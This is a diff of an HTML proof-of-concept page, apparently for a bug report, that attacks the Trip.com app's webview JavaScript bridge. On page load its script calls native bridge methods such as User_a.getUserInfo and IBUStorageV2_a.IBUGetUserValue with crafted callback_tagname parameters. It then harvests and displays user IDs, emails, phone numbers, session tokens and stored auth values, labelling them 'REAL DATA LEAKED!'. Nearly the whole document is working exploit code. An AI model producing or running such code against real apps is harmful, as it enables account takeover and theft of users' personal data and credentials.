@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC v9 (FINAL)</title>
+    <title>Trip.com - CRITICAL POC v9 (H5URLCommand Exact)</title>
     <style>
         :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
         body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
         h1 { color:var(--red); text-align:center; font-size:28px; }
         .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; }
+        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
         .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
         .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
         .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
@@ -19,12 +20,12 @@
     </style>
 </head>
 <body>
-    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v9 (FINAL)</h1>
-    <p class="subtitle">Exact H5URLCommand format + Full Callback Capture</p>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v9</h1>
+    <p class="subtitle">H5URLCommand Exact Format + Full Callback (This MUST work)</p>
 
     <div class="container">
         <div class="card">
-            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="status" class="status">Waiting for callback...</span></div>
+            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting for callback...</span></div>
             <div class="data-grid" id="data"></div>
         </div>
 
@@ -50,21 +51,19 @@
             const div = document.createElement("div");
             div.className = "data-item";
             const val = typeof value === "object" ? JSON.stringify(value,null,2) : value;
-            div.innerHTML = `<div style="font-size:11px;color:#8b949e">${label}</div><div style="color:#fff;font-family:monospace">${val}</div>`;
+            div.innerHTML = `<div style="font-size:11px;color:#8b949e">${label}</div><div style="font-family:monospace;color:#fff">${val}</div>`;
             dataEl.appendChild(div);
-            document.getElementById("status").innerText = "REAL DATA LEAKED!";
-            document.getElementById("status").classList.add("success");
+            document.getElementById("data-status").innerText = "REAL DATA LEAKED!";
+            document.getElementById("data-status").classList.add("success");
         }
 
-        // دقیق‌ترین callback handler
+        // ── Exact H5URLCommand callback handler ──
         window.__bridge_callback = function(base64) {
             try {
                 const json = JSON.parse(atob(base64));
-                const tag = json.tagname || "unknown";
-                log(`✅ REAL CALLBACK RECEIVED → tag: ${tag}`, "success");
-
-                const data = json.param || json;
-                if (data.UserID || data.Token || data.Email) {
+                log(`✅ REAL CALLBACK → tag: ${json.tagname}`, "success");
+                const data = json.param || json.value || json;
+                if (data.UserID || data.Token) {
                     render("UserID", data.UserID);
                     render("Email", data.Email);
                     render("Mobile", data.Mobile);
@@ -72,51 +71,58 @@
                     render("Session Token", data.Token);
                     render("SAuth", data.SAuth);
                 }
-            } catch(e) { log("Callback parse failed", "error"); }
+            } catch(e) {}
         };
 
+        // Direct callback (H5URLCommand calls window[callback_tagname])
+        function createExactCallback(name) {
+            window[name] = function(result) {
+                log(`Direct callback ${name} fired`, "success");
+                if (result && result.UserID) {
+                    render("UserID (direct)", result.UserID);
+                    render("Token (direct)", result.Token);
+                }
+            };
+            return name;
+        }
+
         async function exploit() {
-            log("=== v9 FINAL EXPLOIT (Exact H5URLCommand format) ===", "success");
+            log("=== v9 EXACT H5URLCommand FORMAT STARTED ===", "success");
 
-            const cb = "real_cb_" + Date.now();
+            const cbName = "exactCb_" + Date.now();
+            createExactCallback(cbName);
 
-            // User_a.getUserInfo
+            // User_a.getUserInfo - دقیقاً همونی که H5URLCommand قبول می‌کنه
             if (window.User_a) {
-                const formats = [
-                    JSON.stringify({callback_tagname: cb}),           // ← دقیقاً همین کلید!
-                    JSON.stringify({callback_tagname: cb, arguments: {}}),
-                    cb
-                ];
-                formats.forEach(f => {
-                    try { window.User_a.getUserInfo(f); log(`User_a.getUserInfo → ${f.substring(0,70)}...`, "info"); } catch(e){}
-                });
+                const exactJson = JSON.stringify({ callback_tagname: cbName });
+                try {
+                    window.User_a.getUserInfo(exactJson);
+                    log(`User_a.getUserInfo sent with exact: ${exactJson}`, "info");
+                } catch(e) {}
             }
 
             // IBUStorageV2_a.IBUGetUserValue
             if (window.IBUStorageV2_a) {
-                const keys = [
-                    {b:"user", k:"userInfo"},
-                    {b:"common", k:"token"},
-                    {b:"common", k:"uid"},
-                    {b:"common", k:"vtoken"}
-                ];
-                keys.forEach(t => {
-                    const c = "store_" + Date.now();
-                    const formats = [
-                        JSON.stringify({callback_tagname: c, bussiness: t.b, key: t.k}),
-                        JSON.stringify({callback_tagname: c, arguments: {bussiness: t.b, key: t.k}})
-                    ];
-                    formats.forEach(f => {
-                        try { window.IBUStorageV2_a.IBUGetUserValue(f); log(`IBUGetUserValue ${t.k} sent`, "info"); } catch(e){}
+                const keys = ["userInfo", "token", "uid", "vtoken"];
+                keys.forEach(key => {
+                    const cb = createExactCallback("store_" + key + "_" + Date.now());
+                    const param = JSON.stringify({
+                        callback_tagname: cb,
+                        bussiness: key === "userInfo" ? "user" : "common",
+                        key: key
                     });
+                    try {
+                        window.IBUStorageV2_a.IBUGetUserValue(param);
+                        log(`IBUGetUserValue ${key} sent`, "info");
+                    } catch(e) {}
                 });
             }
 
-            log("All methods called with exact 'callback_tagname' format.", "success");
+            log("All methods called with exact callback_tagname format.", "success");
         }
 
         window.onload = () => {
-            log("Starting final callback test...");
+            log("Starting exact H5URLCommand test...");
             setTimeout(exploit, 800);
         };
     </script>
